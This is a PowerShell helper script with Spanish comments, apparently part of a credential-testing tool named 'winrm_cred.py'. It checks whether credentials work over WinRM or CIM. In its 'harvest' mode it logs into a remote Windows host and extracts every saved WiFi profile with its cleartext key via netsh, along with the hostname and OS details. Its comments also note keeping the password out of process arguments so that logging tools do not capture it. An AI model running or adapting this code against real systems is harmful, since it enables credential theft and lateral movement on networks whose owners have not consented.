<#
Helper invocado por winrm_cred.py. Dos modos:
  -Action test     -> solo valida si las credenciales autentican via WinRM.
  -Action harvest   -> ademas obtiene hostname, SO exacto y perfiles WiFi
                       guardados (con contrasena) del equipo remoto, usando
                       la sesion ya autenticada. Requiere que la cuenta
                       tenga privilegios (normalmente administrador local)
                       para leer las claves WiFi con 'key=clear'.
Se comunican con Python via una linea "RESULT:..." en stdout.

La contrasena se recibe por stdin (una linea), NUNCA como parametro
-Password: un argumento de linea de comandos queda expuesto en texto plano
en el argv del proceso, visible para cualquier otro proceso local
(Administrador de tareas, Sysmon Event ID 1, Script Block Logging).
#>
param(
    [Parameter(Mandatory = $true)][string]$ComputerName,
    [Parameter(Mandatory = $true)][string]$Username,
    [Parameter(Mandatory = $false)][ValidateSet("test", "harvest", "osonly")][string]$Action = "test"
)

$ErrorActionPreference = "Stop"
$plainPassword = [Console]::In.ReadLine()
$securePass = ConvertTo-SecureString $plainPassword -AsPlainText -Force
Remove-Variable plainPassword
$cred = New-Object System.Management.Automation.PSCredential("$ComputerName\$Username", $securePass)

try {
    if ($Action -eq "test") {
        Invoke-Command -ComputerName $ComputerName -Credential $cred -ScriptBlock { $env:COMPUTERNAME } -ErrorAction Stop | Out-Null
        Write-Output "RESULT:SUCCESS"
    }
    elseif ($Action -eq "osonly") {
        # Usa WMI/CIM sobre DCOM (puerto 135), funciona aunque WinRM este apagado.
        $os = Get-CimInstance -ComputerName $ComputerName -Credential $cred -ClassName Win32_OperatingSystem -ErrorAction Stop
        $cs = Get-CimInstance -ComputerName $ComputerName -Credential $cred -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
        $data = [PSCustomObject]@{
            Hostname  = $cs.Name
            OSCaption = $os.Caption
            OSVersion = $os.Version
        }
        Write-Output "RESULT:SUCCESS"
        $data | ConvertTo-Json -Compress
    }
    else {
        $data = Invoke-Command -ComputerName $ComputerName -Credential $cred -ErrorAction Stop -ScriptBlock {
            $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
            $profiles = @()
            try {
                $rawList = netsh wlan show profiles
                $names = @()
                foreach ($line in $rawList) {
                    if ($line -match ":\s*(.+)\s*$" -and ($line -match "All User Profile" -or $line -match "Perfil de todos los usuarios")) {
                        $names += $Matches[1].Trim()
                    }
                }
                foreach ($n in $names) {
                    $detail = netsh wlan show profile name="$n" key=clear
                    $pass = $null
                    foreach ($line in $detail) {
                        if ($line -match "^\s*(Key Content|Contenido de la clave)\s*:\s*(.+)\s*$") {
                            $pass = $Matches[2].Trim()
                            break
                        }
                    }
                    $profiles += [PSCustomObject]@{ SSID = $n; Password = $pass }
                }
            }
            catch { }
            [PSCustomObject]@{
                Hostname     = $env:COMPUTERNAME
                OSCaption    = $os.Caption
                OSVersion    = $os.Version
                WifiProfiles = $profiles
            }
        }
        Write-Output "RESULT:SUCCESS"
        $data | ConvertTo-Json -Depth 4 -Compress
    }
}
catch {
    Write-Output "RESULT:FAIL:$($_.Exception.Message)"
}
